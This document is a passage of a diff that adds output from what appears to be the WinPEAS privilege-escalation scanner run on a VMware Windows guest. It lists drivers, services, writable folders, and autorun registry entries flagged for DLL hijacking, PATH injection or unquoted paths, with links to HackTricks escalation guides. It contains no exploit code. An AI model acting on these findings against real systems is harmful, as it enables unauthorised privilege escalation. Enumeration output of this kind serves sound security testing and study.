+    @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(QLogic Corporation - @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[System32\drivers\evbda.sys] - Boot                                                                                                                                                    
+   =================================================================================================
+
+    @iagpio.inf,%iagpio.SVCDESC%;Intel Serial IO GPIO Controller Driver(Intel(R) Corporation - @iagpio.inf,%iagpio.SVCDESC%;Intel Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iagpio.sys] - System                                                                                                                                    
+   =================================================================================================
+
+    @iai2c.inf,%iai2c.SVCDESC%;Intel(R) Serial IO I2C Host Controller(Intel(R) Corporation - @iai2c.inf,%iai2c.SVCDESC%;Intel(R) Serial IO I2C Host Controller)[C:\Windows\System32\drivers\iai2c.sys] - System                                                                                                                                         
+   =================================================================================================
+
+    @iaLPSS2i_GPIO2_SKL.inf,%iaLPSS2i_GPIO2.SVCDESC%;Intel(R) Serial IO GPIO Driver v2(Intel Corporation - @iaLPSS2i_GPIO2_SKL.inf,%iaLPSS2i_GPIO2.SVCDESC%;Intel(R) Serial IO GPIO Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_GPIO2.sys] - System
+   =================================================================================================
+
+    @iaLPSS2i_GPIO2_BXT_P.inf,%iaLPSS2i_GPIO2_BXT_P.SVCDESC%;Intel(R) Serial IO GPIO Driver v2(Intel Corporation - @iaLPSS2i_GPIO2_BXT_P.inf,%iaLPSS2i_GPIO2_BXT_P.SVCDESC%;Intel(R) Serial IO GPIO Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_GPIO2_BXT_P.sys] - System
+   =================================================================================================
+
+    @iaLPSS2i_I2C_SKL.inf,%iaLPSS2i_I2C.SVCDESC%;Intel(R) Serial IO I2C Driver v2(Intel Corporation - @iaLPSS2i_I2C_SKL.inf,%iaLPSS2i_I2C.SVCDESC%;Intel(R) Serial IO I2C Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_I2C.sys] - System
+   =================================================================================================
+
+    @iaLPSS2i_I2C_BXT_P.inf,%iaLPSS2i_I2C_BXT_P.SVCDESC%;Intel(R) Serial IO I2C Driver v2(Intel Corporation - @iaLPSS2i_I2C_BXT_P.inf,%iaLPSS2i_I2C_BXT_P.SVCDESC%;Intel(R) Serial IO I2C Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_I2C_BXT_P.sys] - System
+   =================================================================================================
+
+    @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver(Intel Corporation - @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_GPIO.sys] - System
+   =================================================================================================
+
+    @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver(Intel Corporation - @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_I2C.sys] - System
+   =================================================================================================
+
+    @iastorav.inf,%iaStorAV.DeviceDesc%;Intel(R) SATA RAID Controller Windows(Intel Corporation - @iastorav.inf,%iaStorAV.DeviceDesc%;Intel(R) SATA RAID Controller Windows)[System32\drivers\iaStorAV.sys] - Boot
+   =================================================================================================
+
+    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot                                                                                                                                                     
+   =================================================================================================
+
+    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[C:\Windows\System32\drivers\ibbus.sys] - System                                                                                                                               
+   =================================================================================================
+
+    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[C:\Windows\System32\drivers\mlx4_bus.sys] - System                                                                                                                                            
+   =================================================================================================
+
+    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[C:\Windows\System32\drivers\ndfltr.sys] - System
+   =================================================================================================
+
+    @oem6.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver(VMware, Inc. - @oem6.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver)[System32\drivers\pvscsi.sys] - Boot
+   =================================================================================================
+
+    @SDFRd.inf,%SDFRd.ServiceDesc%;SDF Reflector(@SDFRd.inf,%SDFRd.ServiceDesc%;SDF Reflector)[C:\Windows\System32\drivers\SDFRd.sys] - System
+   =================================================================================================
+
+    TP AutoConnect Service(ThinPrint GmbH - TP AutoConnect Service)["C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe"] - System
+    ThinPrint component for creating printers or connecting printer shares automatically.
+   =================================================================================================                                                                        
+
+    TP VC Gateway Service(Cortado AG - TP VC Gateway Service)["C:\Program Files\VMware\VMware Tools\TPVCGateway.exe"] - System
+    ThinPrint component that receives print data from dedicated print servers and forwards it to ThinPrint ICA/RDP Clients.
+   =================================================================================================                                                                        
+
+    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\Windows\System32\drivers\USBSTOR.SYS] - System
+   =================================================================================================
+
+    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\Windows\System32\drivers\USBXHCI.SYS] - System                                                                                                                                            
+   =================================================================================================
+
+    VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Autoload
+    Alias Manager and Ticket Service
+   =================================================================================================                                                                        
+
+    @oem4.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(VMware, Inc. - @oem4.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot
+   =================================================================================================
+
+    VMware Host Guest Client Redirector(VMware, Inc. - VMware Host Guest Client Redirector)[system32\DRIVERS\vmhgfs.sys] - System
+    Implements the VMware HGFS protocol. This protocol provides connectivity to host files provided by the HGFS server.
+   =================================================================================================                                                                        
+
+    Memory Control Driver(VMware, Inc. - Memory Control Driver)[C:\Windows\system32\DRIVERS\vmmemctl.sys] - Autoload
+    Driver to provide enhanced memory management of this virtual machine.
+   =================================================================================================                                                                        
+
+    @oem8.inf,%VMMouse.SvcDesc%;VMware Pointing Device(VMware, Inc. - @oem8.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[C:\Windows\System32\drivers\vmmouse.sys] - System
+   =================================================================================================
+
+    VMware Physical Disk Helper(VMware, Inc. - VMware Physical Disk Helper)[C:\Windows\system32\DRIVERS\vmrawdsk.sys] - System
+    VMware Physical Disk Helper
+   =================================================================================================                                                                        
+
+    VMware Tools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Autoload
+    Provides support for synchronizing objects between the host and guest operating systems.
+   =================================================================================================                                                                        
+
+    VMware Physical Disk Helper Service(VMware, Inc. - VMware Physical Disk Helper Service)["C:\Program Files\VMware\VMware Tools\vmacthlp.exe"] - Autoload
+    Enables support for running virtual machines from a physical disk partition
+   =================================================================================================                                                                        
+
+    VMware CAF AMQP Communication Service(VMware CAF AMQP Communication Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe"] - System
+    VMware Common Agent AMQP Communication Service
+   =================================================================================================                                                                        
+
+    VMware CAF Management Agent Service(VMware CAF Management Agent Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"] - Autoload
+    VMware Common Agent Management Agent Service
+   =================================================================================================                                                                        
+
+    @oem5.inf,%vmxnet3.ndis6.Service.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver(VMware, Inc. - @oem5.inf,%vmxnet3.ndis6.Service.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver)[C:\Windows\System32\drivers\vmxnet3.sys] - System
+   =================================================================================================
+
+    vSockets Virtual Machine Communication Interface Sockets driver(VMware, Inc. - vSockets Virtual Machine Communication Interface Sockets driver)[C:\Windows\system32\DRIVERS\vsock.sys] - Boot                                                                                                                                                       
+    vSockets Driver
+   =================================================================================================                                                                        
+
+    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot
+   =================================================================================================
+
+    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[C:\Windows\System32\drivers\winmad.sys] - System
+   =================================================================================================
+
+    @winusb.inf,%WINUSB_SvcDesc%;WinUsb Driver(@winusb.inf,%WINUSB_SvcDesc%;WinUsb Driver)[C:\Windows\System32\drivers\WinUSB.SYS] - System
+   =================================================================================================
+
+    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[C:\Windows\System32\drivers\winverbs.sys] - System
+   =================================================================================================
+
+
+???????????? Modifiable Services
+? Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
+    You cannot modify any service
+
+???????????? Looking if you can modify any service registry
+? Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions
+    [-] Looks like you cannot change the registry of any service...
+
+???????????? Checking write permissions in PATH folders (DLL Hijacking)
+? Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking
+    C:\Windows\system32
+    C:\Windows
+    C:\Windows\System32\Wbem
+    C:\Windows\System32\WindowsPowerShell\v1.0\
+
+
+????????????????????????????????????? Applications Information ?????????????????????????????????????
+
+???????????? Current Active Window Application
+  [X] Exception: Object reference not set to an instance of an object.
+
+???????????? Installed Applications --Via Program Files/Uninstall registry--
+? Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
+    C:\Program Files\Common Files
+    C:\Program Files\desktop.ini
+    C:\Program Files\Internet Explorer
+    C:\Program Files\Uninstall Information
+    C:\Program Files\VMware
+    C:\Program Files\Windows Defender
+    C:\Program Files\Windows Defender Advanced Threat Protection
+    C:\Program Files\Windows Mail
+    C:\Program Files\Windows Media Player
+    C:\Program Files\Windows Multimedia Platform
+    C:\Program Files\Windows NT
+    C:\Program Files\Windows Photo Viewer
+    C:\Program Files\Windows Portable Devices
+    C:\Program Files\Windows Security
+    C:\Program Files\Windows Sidebar
+    C:\Program Files\WindowsApps
+    C:\Program Files\WindowsPowerShell
+
+
+???????????? Autorun Applications
+? Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                                
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+    Key: SecurityHealth
+    Folder: C:\Program Files\Windows Defender
+    File: C:\Program Files\Windows Defender\MSASCuiL.exe (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+    Key: VMware User Process
+    Folder: C:\Program Files\VMware\VMware Tools
+    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    RegPerms: Destitute [FullControl]
+    Key: OneDrive
+    Folder: C:\Users\Destitute\AppData\Local\Microsoft\OneDrive
+    FolderPerms: Destitute [AllAccess]
+    File: C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
+    FilePerms: Destitute [AllAccess]
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+    Key: Common Startup
+    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+    Key: Common Startup
+    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+    Key: Userinit
+    Folder: C:\Windows\system32
+    File: C:\Windows\system32\userinit.exe,
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+    Key: Shell
+    Folder: None (PATH Injection)
+    File: explorer.exe
+   =================================================================================================
+
+
+    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
+    Key: AlternateShell
+    Folder: None (PATH Injection)
+    File: cmd.exe
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
+    Key: Adobe Type Manager
+    Folder: None (PATH Injection)
+    File: atmfd.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
+    Key: Adobe Type Manager
+    Folder: None (PATH Injection)
+    File: atmfd.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: midimapper
+    Folder: None (PATH Injection)
+    File: midimap.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.imaadpcm
+    Folder: None (PATH Injection)
+    File: imaadp32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.l3acm
+    Folder: C:\Windows\System32
+    File: C:\Windows\System32\l3codeca.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msadpcm
+    Folder: None (PATH Injection)
+    File: msadp32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msg711
+    Folder: None (PATH Injection)
+    File: msg711.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msgsm610
+    Folder: None (PATH Injection)
+    File: msgsm32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.i420
+    Folder: None (PATH Injection)
+    File: iyuv_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.iyuv
+    Folder: None (PATH Injection)
+    File: iyuv_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.mrle
+    Folder: None (PATH Injection)
+    File: msrle32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.msvc
+    Folder: None (PATH Injection)
+    File: msvidc32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.uyvy
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yuy2
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yvu9
+    Folder: None (PATH Injection)
+    File: tsbyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yvyu
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: wavemapper
+    Folder: None (PATH Injection)
+    File: msacm32.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: midimapper
+    Folder: None (PATH Injection)
+    File: midimap.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.imaadpcm
+    Folder: None (PATH Injection)
+    File: imaadp32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.l3acm
+    Folder: C:\Windows\SysWOW64
+    File: C:\Windows\SysWOW64\l3codeca.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msadpcm
+    Folder: None (PATH Injection)
+    File: msadp32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msg711
+    Folder: None (PATH Injection)
+    File: msg711.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msgsm610
+    Folder: None (PATH Injection)
+    File: msgsm32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.cvid
+    Folder: None (PATH Injection)
+    File: iccvid.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.i420
+    Folder: None (PATH Injection)
+    File: iyuv_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.iyuv
+    Folder: None (PATH Injection)
+    File: iyuv_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.mrle
+    Folder: None (PATH Injection)
+    File: msrle32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.msvc
+    Folder: None (PATH Injection)
+    File: msvidc32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.uyvy
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yuy2
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yvu9
+    Folder: None (PATH Injection)
+    File: tsbyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yvyu
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: wavemapper
+    Folder: None (PATH Injection)
+    File: msacm32.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
+    Folder: C:\Program Files\Internet Explorer
+    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: _wow64
+    Folder: None (PATH Injection)
+    File: wow64.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: _wow64cpu
+    Folder: None (PATH Injection)
+    File: wow64cpu.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: _wow64win
+    Folder: None (PATH Injection)
+    File: wow64win.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: _wowarmhw
+    Folder: None (PATH Injection)
+    File: wowarmhw.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: advapi32
+    Folder: None (PATH Injection)
+    File: advapi32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: clbcatq
+    Folder: None (PATH Injection)
+    File: clbcatq.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: combase
+    Folder: None (PATH Injection)
+    File: combase.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: COMDLG32
+    Folder: None (PATH Injection)
+    File: COMDLG32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: coml2
+    Folder: None (PATH Injection)
+    File: coml2.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: DifxApi
+    Folder: None (PATH Injection)
+    File: difxapi.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: gdi32
+    Folder: None (PATH Injection)
+    File: gdi32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: gdiplus
+    Folder: None (PATH Injection)
+    File: gdiplus.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: IMAGEHLP
+    Folder: None (PATH Injection)
+    File: IMAGEHLP.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: IMM32
+    Folder: None (PATH Injection)
+    File: IMM32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: kernel32
+    Folder: None (PATH Injection)
+    File: kernel32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: MSCTF
+    Folder: None (PATH Injection)
+    File: MSCTF.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: MSVCRT
+    Folder: None (PATH Injection)
+    File: MSVCRT.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: NORMALIZ
+    Folder: None (PATH Injection)
+    File: NORMALIZ.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: NSI
+    Folder: None (PATH Injection)
+    File: NSI.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: ole32
+    Folder: None (PATH Injection)
+    File: ole32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: OLEAUT32
+    Folder: None (PATH Injection)
+    File: OLEAUT32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: PSAPI
+    Folder: None (PATH Injection)
+    File: PSAPI.DLL
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: rpcrt4
+    Folder: None (PATH Injection)
+    File: rpcrt4.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: sechost
+    Folder: None (PATH Injection)
+    File: sechost.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: Setupapi
+    Folder: None (PATH Injection)
+    File: Setupapi.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: SHCORE
+    Folder: None (PATH Injection)
+    File: SHCORE.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: SHELL32
+    Folder: None (PATH Injection)
+    File: SHELL32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: SHLWAPI
+    Folder: None (PATH Injection)
+    File: SHLWAPI.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: user32
+    Folder: None (PATH Injection)
+    File: user32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: WLDAP32
+    Folder: None (PATH Injection)
+    File: WLDAP32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: WS2_32
+    Folder: None (PATH Injection)
+    File: WS2_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
+    Key: StubPath
+    Folder: \
+    FolderPerms: Authenticated Users [AppendData/CreateDirectories]
+    File: /UserInstall
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}
+    Key: StubPath
+    Folder: C:\Program Files\Windows Mail
+    File: C:\Program Files\Windows Mail\WinMail.exe OCInstallUserConfigOE (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
+    Key: StubPath
+    Folder: C:\Windows\system32
+    File: C:\Windows\system32\unregmp2.exe /FirstLogon
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
+    Key: StubPath
+    Folder: None (PATH Injection)
+    File: U
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
+    Key: StubPath
+    Folder: C:\Windows\System32
+    File: C:\Windows\System32\ie4uinit.exe -UserConfig
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
+    Key: StubPath
+    Folder: C:\Windows\System32
+    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}
+    Key: StubPath
+    Folder: C:\Program Files\Windows Mail
+    File: C:\Program Files\Windows Mail\WinMail.exe OCInstallUserConfigOE (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
+    Key: StubPath
+    Folder: C:\Windows\system32
+    File: C:\Windows\system32\unregmp2.exe /FirstLogon
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
+    Key: StubPath
+    Folder: C:\Windows\SysWOW64
+    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
+   =================================================================================================
+
+
+    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
+   =================================================================================================
+
+
+    Folder: C:\windows\tasks
+    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+   =================================================================================================
+
+
+    Folder: C:\windows\system32\tasks
+    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+   =================================================================================================
+
+
+    Folder: C:\windows
+    File: C:\windows\system.ini
+   =================================================================================================
+
+
+    Folder: C:\windows
+    File: C:\windows\win.ini
+   =================================================================================================
+
+
+    Key: From WMIC
+    Folder: C:\Users\Destitute\AppData\Local\Microsoft\OneDrive
+    FolderPerms: Destitute [AllAccess]
+    File: C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
+    FilePerms: Destitute [AllAccess]
+   =================================================================================================
+
+
+    Key: From WMIC
+    Folder: C:\Program Files\Windows Defender
